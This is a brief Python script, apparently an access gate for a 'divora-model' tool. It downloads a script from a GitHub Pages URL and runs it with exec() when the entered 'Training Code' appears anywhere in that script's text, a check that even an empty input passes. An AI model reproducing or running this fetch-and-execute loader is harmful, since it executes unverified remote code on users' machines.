import urllib.request
import subprocess

# Load the online Python script
url = "https://bimex-software.github.io/divora-model/generated.py"
response = urllib.request.urlopen(url)
python_script = response.read().decode('utf-8')

# User input
user_input = input("Enter Training Code: ")

# Check if user input is in the script
if user_input in python_script:
    print("Access granted")
    # Execute the Python script
    exec(python_script)
else:
    print("Access denied")
